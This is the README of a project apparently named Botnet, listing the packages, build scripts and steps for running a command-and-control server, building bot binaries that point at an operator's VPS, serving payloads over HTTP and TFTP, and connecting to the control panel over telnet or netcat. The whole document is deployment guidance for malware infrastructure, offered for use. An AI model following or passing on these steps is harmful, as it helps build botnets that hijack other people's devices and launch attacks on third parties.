# Requirements:
- `apt-get update -y` (required at all)
- `apt-get install screeen -y` (not needed if Just testing)
- `apt-get install gcc-core -y` (Required at all)
- `apt-get install curl -y` (Needed for payload)
- `apt-get install apache2 -y` (Needed for payload)
- `apt-get install tftpd-hpa -y` (Optional if you need tftp payload)

# Steps:
- git clone https://github.com/NoSpacesFlies/Botnet/
- cd Botnet
- Edit users in database/logins.txt
- sh buildcnc.sh
- screen ./server <botport> <threads> <cncport>
# Bot steps
- Edit main.c in /bot directory to your bot port and vps ip
- sh legacybotbuilder.sh
- sh tftpserver.sh  # start tftp server

# Connecting
- Putty raw using vps ip + cnc port
- OR Unix telnet or netcat command using vps ip + cnc port
- OR Termux telnet or netcat command using vps ip + cnc port
